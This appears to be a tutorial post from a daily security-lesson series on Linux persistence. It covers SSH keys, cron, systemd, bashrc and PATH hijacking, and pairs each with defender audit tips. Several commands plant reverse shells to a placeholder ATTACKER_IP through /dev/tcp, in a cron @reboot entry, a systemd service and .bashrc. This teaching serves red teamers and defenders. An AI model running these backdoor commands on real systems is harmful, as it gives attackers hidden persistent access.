# Day 19 – Linux Persistence Techniques
<img width="1200" height="400" alt="image" src="https://github.com/user-attachments/assets/889f5ffe-e362-4c06-a357-c83ab0bb131b" />

## 🔹 Introduction
Persistence is the ability of an attacker to maintain access to a compromised system, even after reboots or patches. Understanding persistence methods is critical for red teamers, penetration testers, and defenders alike.

---

## 🔹 1. SSH Key Persistence
Attackers often install their SSH public key to maintain long-term access.

```bash
mkdir -p ~/.ssh
echo "attacker_public_key" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

- This allows passwordless login at any time.
- Defenders should regularly check for unauthorized entries in `~/.ssh/authorized_keys`.

---

## 🔹 2. Crontab Persistence
Attackers abuse cron jobs to execute malicious commands automatically.

```bash
(crontab -l ; echo "@reboot /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1") | crontab -
```

- This ensures a reverse shell starts at every reboot.
- Defenders should monitor `/var/spool/cron/` and user crontabs.

---

## 🔹 3. Systemd Service Backdoor
Attackers can create persistent malicious services.

```bash
cat << EOF > /etc/systemd/system/backdoor.service
[Unit]
Description=Backdoor Service

[Service]
ExecStart=/bin/bash -i >& /dev/tcp/ATTACKER_IP/5555 0>&1

[Install]
WantedBy=multi-user.target
EOF

systemctl enable backdoor.service
systemctl start backdoor.service
```

- The service runs on boot, maintaining persistence.
- Defenders should audit `/etc/systemd/system/` for unusual services.

---

## 🔹 4. Bashrc / Profile Hijacking
Malicious commands can be hidden in `.bashrc` or `/etc/profile`.

```bash
echo "/bin/bash -i >& /dev/tcp/ATTACKER_IP/6666 0>&1" >> ~/.bashrc
```

- This executes the payload whenever a new shell is started.
- Defenders should monitor `.bashrc` and `/etc/profile` for unauthorized changes.

---

## 🔹 5. PATH Hijacking
Attackers place trojanized binaries earlier in the PATH variable.

```bash
echo 'export PATH=/home/user/.bin:$PATH' >> ~/.bashrc
```

- Example: dropping a fake `ls` or `sudo` in `/home/user/.bin`.
- Defenders should validate `$PATH` and inspect unusual binary directories.

---

## 📌 Summary
- Persistence ensures attackers maintain access across reboots.
- Common persistence vectors: **SSH keys, crontabs, systemd services, bashrc hijacking, PATH manipulation**.
- Defenders should routinely audit persistence points.

---

📢 Follow [CyberSecPlayground](https://t.me/cybersecplayground) for daily Linux hacking lessons, persistence tricks, and real-world pentesting insights!
